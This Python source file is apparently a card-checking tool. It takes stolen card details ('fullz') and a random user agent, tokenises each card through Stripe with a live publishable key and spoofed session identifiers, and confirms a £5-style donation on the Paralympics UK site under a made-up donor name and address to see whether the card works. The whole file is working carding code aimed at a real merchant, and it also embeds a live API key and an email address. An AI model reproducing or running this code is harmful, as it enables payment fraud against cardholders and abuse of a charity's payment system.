import asyncio
import json
import random
import re
import time
import uuid
from fake_useragent import UserAgent
import requests
from FUNC.defs import *

async def create_cvv_charge(fullz , session):
    try:
        cc , mes , ano , cvv = fullz.split("|")
        random_data          = await get_random_info(session)
        fname                = random_data["fname"]
        lname                = random_data["lname"]
        email                = random_data["email"]
        phone                = random_data["phone"]
        add1                 = random_data["add1"]
        city                 = random_data["city"]
        state                = random_data["state"]
        state_short          = random_data["state_short"]
        zip_code             = random_data["zip"]
        user_agent           = UserAgent().random





        data={
            'guid':'28dd4122-df19-4924-b86f-8d7a6c26103ba6c29e',
            'muid':'2a40f7bb-3362-417b-b123-8e9773acb05d9c1a9c',
            'sid':'534eed68-a487-46d3-bf39-f2c1c5479897c4712e',
            'referrer':'https://paralympics.org.uk',
            'time_on_page':'39824',
            'card[number]':cc,
            'card[cvc]':cvv,
            'card[exp_month]':mes,
            'card[exp_year]':ano,
            'payment_user_agent':'stripe.js/bf317941e9; stripe-js-v3/bf317941e9; card-element',
            'pasted_fields':'number',
            'key':'pk_live_h88Yq5hugfKaUB8gJ7OFv3ot0046XoMB1l'
            }
        response = await session.post('https://api.stripe.com/v1/tokens', data=data)

        # print(response.text)
        try:
            id =response.json()["id"]
            # print(id)
        except:
            message = response.json()["error"]["message"]
            return message
        
        json_data = {
            'operationName': 'Donate',
            'variables': {
                'name': 'CRISH NIKI',
                'email': 'crishniki158@gmail.com',
                'amount': 500,
                'line1': '1701 W Ashley Rd',
                'city': 'Boonville',
                'country': 'TH',
                'postalCode': '65233-2748',
                'giftAid': False,
            },
            'query': 'mutation Donate($name: String!, $email: String!, $amount: Int!, $line1: String!, $city: String!, $country: String!, $postalCode: String!, $giftAid: Boolean!) {\n  Donate(name: $name, email: $email, amount: $amount, address: {line1: $line1, city: $city, country: $country, postalCode: $postalCode}, giftaid: $giftAid) {\n    id\n    clientSecret\n    __typename\n  }\n}\n',
        }

        response = await session.post('https://paralympics.org.uk/api/graphql', json=json_data)


        try:
            pi_id=response.json()["data"]["Donate"]["id"]
            clientSecret=response.json()["data"]["Donate"]["clientSecret"]

            # print(pi_id)
            # print(clientSecret)

        except:
            return "clientSecret error"
        

        data={
            'payment_method_data[type]':'card',
            'payment_method_data[card][token]':id,
            'payment_method_data[billing_details][address][city]':'Boonville',
            'payment_method_data[billing_details][address][country]':'TH',
            'payment_method_data[billing_details][address][line1]':'1701 W Ashley Rd',
            'payment_method_data[billing_details][address][postal_code]':'65233-2748',
            'payment_method_data[guid]':'28dd4122-df19-4924-b86f-8d7a6c26103ba6c29e',
            'payment_method_data[muid]':'2a40f7bb-3362-417b-b123-8e9773acb05d9c1a9c',
            'payment_method_data[sid]':'534eed68-a487-46d3-bf39-f2c1c5479897c4712e',
            'payment_method_data[payment_user_agent]':'stripe.js/bf317941e9; stripe-js-v3/bf317941e9',
            'payment_method_data[referrer]':'https://paralympics.org.uk',
            'payment_method_data[time_on_page]':'47525',
            'expected_payment_method_type':'card',
            'use_stripe_sdk':'true',
            'key':'pk_live_h88Yq5hugfKaUB8gJ7OFv3ot0046XoMB1l',
            'client_secret':clientSecret
            }
        response = await session.post(
            f'https://api.stripe.com/v1/payment_intents/{pi_id}/confirm',
            data=data,
        )
        # print(response.text)



        # try:
        #     decline_code= response.json()["error"]["decline_code"]
        #     print(decline_code)
        # except:
        #     print(response.text)
 
        await asyncio.sleep(0.5)
        return response

    except Exception as e:
        return str(e)